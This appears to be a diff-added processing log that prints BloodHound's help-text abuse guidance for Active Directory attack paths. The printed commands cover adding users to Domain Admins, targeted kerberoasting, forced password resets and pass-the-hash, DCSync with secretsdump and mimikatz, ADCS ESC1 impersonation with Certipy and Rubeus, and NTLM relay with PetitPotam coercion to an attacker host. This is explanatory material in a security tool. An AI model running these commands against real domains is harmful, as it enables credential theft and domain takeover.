+                {'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddSelf
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddSelf/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                There are at least two ways to execute this attack. The first and most obvious is by using the built-in
+                net.exe binary in Windows (e.g.: net group "Domain Admins" dfm.a /add /domain). See the opsec
+                considerations tab for why this may be a bad idea. The second, and highly recommended method, is by
+                using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe
+                binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a
+                process as or logon as the user with the AddMember permission. Additionally, you have much safer
+                execution options than you do with spawning net.exe (see the opsec tab).
+            </Typography>
+
+            <Typography variant='body2'>
+                To abuse this permission with PowerView's Add-DomainGroupMember, first import PowerView into your agent
+                session or into a PowerShell instance at the console.{' '}
+            </Typography>
+
+            <Typography variant='body2'>
+                You may need to authenticate to the Domain Controller as{' '}
+                {sourceType === 'User'
+                    ? `${sourceName} if you are not running a process as that user`
+                    : `a member of ${sourceName} if you are not running a process as a member`}
+                . To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these
+                examples comes from the PowerView help documentation):
+            </Typography>
+
+            <Typography component={'pre'}>
+                {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
+                    "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
+            </Typography>
+
+            <Typography variant='body2'>
+                Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as{' '}
+                {sourceName}:
+            </Typography>
+
+            <Typography component={'pre'}>
+                {"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}
+            </Typography>
+
+            <Typography variant='body2'>
+                Finally, verify that the user was successfully added to the group with PowerView's
+                Get-DomainGroupMember:
+            </Typography>
+
+            <Typography component={'pre'}>{"Get-DomainGroupMember -Identity 'Domain Admins'"}</Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteSPN
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteSPN
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteSPN/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                A targeted kerberoast attack can be performed using{' '}
+                <Link target='_blank' rel='noopener' href='https://github.com/ShutdownRepo/targetedKerberoast'>
+                    targetedKerberoast.py
+                </Link>
+                .
+            </Typography>
+
+            <Typography component={'pre'}>
+                {"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}
+            </Typography>
+
+            <Typography variant='body2'>
+                The tool will automatically attempt a targetedKerberoast attack, either on all users or against a
+                specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done
+                automatically as well.
+            </Typography>
+
+            <Typography variant='body2'>
+                The recovered hash can be cracked offline using the tool of your choice.
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteSPN
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteSPN/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with
+                Get-DomainSPNTicket.
+            </Typography>
+            <Typography variant='body2'>
+                You may need to authenticate to the Domain Controller as{' '}
+                {sourceType === 'User' || sourceType === 'Computer'
+                    ? `${sourceName} if you are not running a process as that user`
+                    : `a member of ${sourceName} if you are not running a process as a member`}
+                . To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples
+                comes from the PowerView help documentation):
+            </Typography>
+            <Typography component={'pre'}>
+                {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
+                    "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
+            </Typography>
+            <Typography variant='body2'>
+                Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as{' '}
+                {sourceName}:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    "Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"
+                }
+            </Typography>
+            <Typography variant='body2'>After running this, you can use Get-DomainSPNTicket as follows:</Typography>
+            <Typography component={'pre'}>{'Get-DomainSPNTicket -Credential $Cred harmj0y | fl'}</Typography>
+            <Typography variant='body2'>
+                The recovered hash can be cracked offline using the tool of your choice. Cleanup of the
+                ServicePrincipalName can be done with the Set-DomainObject command:
+            </Typography>
+            <Typography component={'pre'}>
+                {'Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname'}
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ForceChangePassword
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ForceChangePassword
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ForceChangePassword/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or
+                prompted interactively if omitted from the command line. The new password will be prompted if omitted
+                from the command line.
+            </Typography>
+
+            <Typography component={'pre'}>
+                {
+                    'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
+                }
+            </Typography>
+
+            <Typography variant='body2'>
+                It can also be done with pass-the-hash using{' '}
+                <Link target='_blank' rel='noopener' href='https://github.com/byt3bl33d3r/pth-toolkit'>
+                    pth-toolkit's net tool
+                </Link>
+                . If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.
+            </Typography>
+
+            <Typography component={'pre'}>
+                {
+                    'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
+                }
+            </Typography>
+            <Typography variant='body2'>
+                Now that you know the target user's plain text password, you can either start a new agent as that user,
+                or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP
+                to a system the target user has access to. For more ideas and information, see the references tab.
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ForceChangePassword
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ForceChangePassword/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                There are at least two ways to execute this attack. The first and most obvious is by using the built-in
+                net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab
+                for why this may be a bad idea. The second, and highly recommended method, is by using the
+                Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in
+                several ways. For instance, you can supply alternate credentials, instead of needing to run a process as
+                or logon as the user with the ForceChangePassword permission. Additionally, you have much safer
+                execution options than you do with spawning net.exe (see the opsec tab).
+            </Typography>
+            <Typography variant='body2'>
+                To abuse this permission with PowerView's Set-DomainUserPassword, first import PowerView into your agent
+                session or into a PowerShell instance at the console. You may need to authenticate to the Domain
+                Controller as
+                {sourceType === 'User'
+                    ? `${sourceName} if you are not running a process as that user`
+                    : `a member of ${sourceName} if you are not running a process as a member`}
+                . To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these
+                examples comes from the PowerView help documentation):
+            </Typography>
+            <Typography component={'pre'}>
+                {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
+                    "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
+            </Typography>
+            <Typography variant='body2'>
+                Then create a secure string object for the password you want to set on the target user:
+            </Typography>
+            <Typography component={'pre'}>
+                {"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}
+            </Typography>
+            <Typography variant='body2'>
+                Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a
+                process as {sourceName}:
+            </Typography>
+            <Typography component={'pre'}>
+                {'Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred'}
+            </Typography>
+            <Typography variant='body2'>
+                Now that you know the target user's plain text password, you can either start a new agent as that user,
+                or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP
+                to a system the target user has access to. For more ideas and information, see the references tab.
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZPrivilegedAuthAdmin
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZPrivilegedAuthAdmin
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGServicePrincipalEndpoint_ReadWrite_All
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGServicePrincipalEndpoint_ReadWrite_All
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DumpSMSAPassword
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DumpSMSAPassword
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GetChanges
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GetChanges
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GetChanges/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's
+                secretsdump.py example script:
+            </Typography>
+
+            <Typography component={'pre'}>
+                {"secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"}
+            </Typography>
+
+            <Typography variant='body2'>
+                You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this
+                see the blog post by harmj0y in the references tab.
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GetChanges
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GetChanges/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get
+                the password hash of an arbitrary principal using mimikatz:
+            </Typography>
+            <Typography component={'pre'}>{'lsadump::dcsync /domain:testlab.local /user:Administrator'}</Typography>
+            <Typography variant='body2'>
+                You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this
+                see the blog post by harmj0y in the references tab.
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZUserAccessAdministrator
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZUserAccessAdministrator
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CrossForestTrust
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CrossForestTrust
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/EnterpriseCAFor
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/EnterpriseCAFor
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/EnterpriseCAFor/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform several attacks that rely on this relationship. This relationship alone is not
+            enough to escalate rights or impersonate other principals. This relationship may contribute to other
+            relationships and attributes, from which an escalation opportunity may emerge.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/EnterpriseCAFor
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/EnterpriseCAFor/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform several attacks that rely on this relationship. This relationship alone is not
+            enough to escalate rights or impersonate other principals. This relationship may contribute to other
+            relationships and attributes, from which an escalation opportunity may emerge.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZLogicAppContributor
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZLogicAppContributor
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZVMContributor
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZVMContributor
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC1
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC1
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC1/LinuxAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
+            <Typography variant='body2'>
+                <b>Step 1</b>: Use Certipy to request enrollment in the affected template, specifying the target
+                enterprise CA and target principal to impersonate:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    'certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1 -upn administrator@corp.local'
+                }
+            </Typography>
+            <Typography variant='body2'>
+                <b>Step 2</b>: Request a ticket granting ticket (TGT) from the domain, specifying the certificate
+                created in Step 1 and the IP of a domain controller:
+            </Typography>
+            <Typography component={'pre'}>{'certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128'}</Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC1
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC1/WindowsAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
+            <Typography variant='body2'>
+                <b>Step 1</b>: Use Certify to request enrollment in the affected template, specifying the affected
+                certification authority and target principal to impersonate:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    'Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:"ESC1" /altname:forestrootda /sidextension:S-1-5-21-2697957641-2271029196-387917394-500'
+                }
+            </Typography>
+            <Typography variant='body2'>Save the certificate as cert.pem and the private key as cert.key.</Typography>
+            <Typography variant='body2'>
+                <b>Step 2</b>: Convert the emitted certificate to PFX format:
+            </Typography>
+            <Typography component={'pre'}>{'certutil.exe -MergePFX .\\cert.pem .\\cert.pfx'}</Typography>
+            <Typography variant='body2'>
+                <b>Step 3</b>: Optionally purge all kerberos tickets from memory:
+            </Typography>
+            <Typography component={'pre'}>{'klist purge'}</Typography>
+            <Typography variant='body2'>
+                <b>Step 4</b>: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the
+                target identity to impersonate and the PFX-formatted certificate created in Step 2:
+            </Typography>
+            <Typography component={'pre'}>
+                {'Rubeus asktgt /user:forestrootda /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt'}
+            </Typography>
+            <Typography variant='body2'>
+                <b>Step 5</b>: Optionally verify the TGT by listing it with the klist command:
+            </Typography>
+            <Typography component={'pre'}>{'klist'}</Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZResetPassword
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZResetPassword
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/OwnsLimitedRights
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/OwnsLimitedRights
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/OwnsLimitedRights/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                To abuse ownership of an object where the OWNER RIGHTS SID is explicitly granted permissions, you can
+                abuse the specific permissions granted to the OWNER RIGHTS SID.
+            </Typography>
+
+            <Typography variant='body2'>
+                Please refer to the abuse info for the specific granted permissions at
+                https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/OwnsLimitedRights
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/OwnsLimitedRights/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                To abuse ownership of an object where the OWNER RIGHTS SID is explicitly granted privileges, you can
+                abuse the specific privileges granted to the OWNER RIGHTS SID.
+                <br />
+                <br />
+                Please refer to the abuse info for the specific privileges granted to OWNER RIGHTS at
+                https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteOwner
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteOwner
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteOwner/LinuxAbuse.tsx:
+                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteOwner
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteOwner/WindowsAbuse.tsx:
+                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToLDAPS
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToLDAPS
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToLDAPS/LinuxAbuse.tsx:
+            <Typography variant={'body2'}>
+                1. Start the Relay Server The NTLM relay can be executed with{' '}
+                <a href={'https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py'}>ntlmrelayx.py</a>. To
+                relay to LDAP and perform a Shadow Credentials attack against the target computer:
+                <CodeController>
+                    {'ntlmrelayx.py -t ldaps://<Domain Controller IP> --shadow-credentials'}
+                </CodeController>
+            </Typography>
+
+            <Typography variant={'body2'}>
+                2. Coerce the Target Computer Several coercion methods are documented here:{' '}
+                <a href={'https://github.com/p0dalirius/windows-coerced-authentication-methods'}>
+                    Windows Coerced Authentication Methods
+                </a>
+                . Examples of tools include:
+                <a href={'https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py'}>printerbug.py</a>
+                <a href={'https://github.com/topotam/PetitPotam'}>PetitPotam</a>
+                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
+                Connection String format: \\SERVER_NETBIOS@PORT/PATH/TO/FILE.
+                <CodeController>
+                    {'Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS@PORT/file.txt" "VICTIM_IP"'}
+                </CodeController>
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToLDAPS
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToLDAPS/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                1: Start the Relay Server The NTLM relay can be executed with Inveigh.
+            </Typography>
+            <Typography variant='body2'>
+                2: Coerce the Target Computer Several coercion methods are documented here:{' '}
+                <a href={'https://github.com/p0dalirius/windows-coerced-authentication-methods'}>
+                    Windows Coerced Authentication Methods
+                </a>
+                . Examples of tools include:
+                <a href={'https://github.com/leechristensen/SpoolSample'}>SpoolSample</a>
+                <a href={'https://github.com/topotam/PetitPotam'}>PetitPotam</a>
+                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
+                Connection String format: \\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe "VICTIM_IP"
+                "ATTACKER_NETBIOS@PORT/file.txt"
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AbuseTGTDelegation
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AbuseTGTDelegation
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ReadLAPSPassword
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ReadLAPSPassword
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ReadLAPSPassword/LinuxAbuse.tsx:
+            <Typography variant='body2'>Read the LAPS password attributes listed in the General section.</Typography>
+            <Typography variant='body2'>
+                Plaintext attributes can be read using a simple LDAP client. For example, with bloodyAD:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"
+                }
+            </Typography>
+
+            <Typography variant='body2'>
+                See Windows abuse for retrieving and decrypting the encrypted attributes.
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ReadLAPSPassword
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ReadLAPSPassword/WindowsAbuse.tsx:
+            <Typography variant='body2'>Read the LAPS password attributes listed in the General section.</Typography>
+            <Typography variant='body2'>
+                Plaintext attributes can be read using a simple LDAP client. For example, with PowerView:
+            </Typography>
+            <Typography component={'pre'}>
+                {'Get-DomainComputer "MachineName" -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"'}
+            </Typography>
+
+            <Typography variant='body2'>
+                Encrypted attributes can be decrypted using Microsoft's LAPS PowerShell module. For example:
+            </Typography>
+            <Typography component={'pre'}>{'Get-LapsADPassword "WIN10" -AsPlainText'}</Typography>
+
+            <Typography variant='body2'>
+                The encrypted attributes can also be retrieved and decrypted using{' '}
+                <Link
+                    target='_blank'
+                    rel='noopener'
+                    href='https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt'>
+                    lapsv2decrypt
+                </Link>{' '}
+                (dotnet or BOF).
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/HasTrustKeys
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/HasTrustKeys
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/TrustedForNTAuth
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/TrustedForNTAuth
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/TrustedForNTAuth/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform several attacks that rely on an Enterprise CA to be trusted, such as ESC1. This
+            relationship alone is not enough to escalate rights or impersonate other principals. This relationship may
+            contribute to other relationships and attributes, from which an escalation opportunity may emerge.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/TrustedForNTAuth
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/TrustedForNTAuth/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform several attacks that rely on an Enterprise CA to be trusted, such as ESC1. This
+            relationship alone is not enough to escalate rights or impersonate other principals. This relationship may
+            contribute to other relationships and attributes, from which an escalation opportunity may emerge.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZAKSContributor
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZAKSContributor
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SyncLAPSPassword
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SyncLAPSPassword
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC10a
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC10a
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC10a/LinuxAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
+            {step1}
+            {step2}
+            {step3}
+            {step4}
+            {step5}
+            {step6}
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC10a
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC10a/WindowsAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
+            {step1}
+            {step2}
+            {step3}
+            {step4}
+            {step5}
+            {step6}
+            {step7}
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGDirectory_ReadWrite_All
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGDirectory_ReadWrite_All
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToLDAP
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToLDAP
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToLDAP/LinuxAbuse.tsx:
+            <Typography variant={'body2'}>
+                1. Start the Relay Server The NTLM relay can be executed with{' '}
+                <a href={'https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py'}>ntlmrelayx.py</a>. To
+                relay to LDAP and perform a Shadow Credentials attack against the target computer:
+                <CodeController>{'ntlmrelayx.py -t ldap://<Domain Controller IP> --shadow-credentials'}</CodeController>
+            </Typography>
+
+            <Typography variant={'body2'}>
+                2. Coerce the Target Computer Several coercion methods are documented here:{' '}
+                <a href={'https://github.com/p0dalirius/windows-coerced-authentication-methods'}>
+                    Windows Coerced Authentication Methods
+                </a>
+                . Examples of tools include:
+                <a href={'https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py'}>printerbug.py</a>
+                <a href={'https://github.com/topotam/PetitPotam'}>PetitPotam</a>
+                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
+                Connection String format: \\SERVER_NETBIOS@PORT/PATH/TO/FILE.
+                <CodeController>
+                    {'Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS@PORT/file.txt" "VICTIM_IP"'}
+                </CodeController>
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToLDAP
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToLDAP/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                1: Start the Relay Server The NTLM relay can be executed with Inveigh.
+            </Typography>
+            <Typography variant='body2'>
+                2: Coerce the Target Computer Several coercion methods are documented here:{' '}
+                <a href={'https://github.com/p0dalirius/windows-coerced-authentication-methods'}>
+                    Windows Coerced Authentication Methods
+                </a>
+                . Examples of tools include:
+                <a href={'https://github.com/leechristensen/SpoolSample'}>SpoolSample</a>
+                <a href={'https://github.com/topotam/PetitPotam'}>PetitPotam</a>
+                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
+                Connection String format: \\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe "VICTIM_IP"
+                "ATTACKER_NETBIOS@PORT/file.txt"
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMemberOf
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMemberOf
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ExecuteDCOM
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ExecuteDCOM
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DCFor
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DCFor
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DCFor/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            Domain Controllers store all Active Directory credentials and configurations for all principals in the
+            domain. If an adversary gains administrative access to a Domain Controller, there are several options at
+            their disposal for compromising domain identities and domain-managed systems. Please see the references
+            section for more information.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DCFor
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DCFor/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            Domain Controllers store all Active Directory credentials and configurations for all principals in the
+            domain. If an adversary gains administrative access to a Domain Controller, there are several options at
+            their disposal for compromising domain identities and domain-managed systems. Please see the references
+            section for more information.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZExecuteCommand
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZExecuteCommand
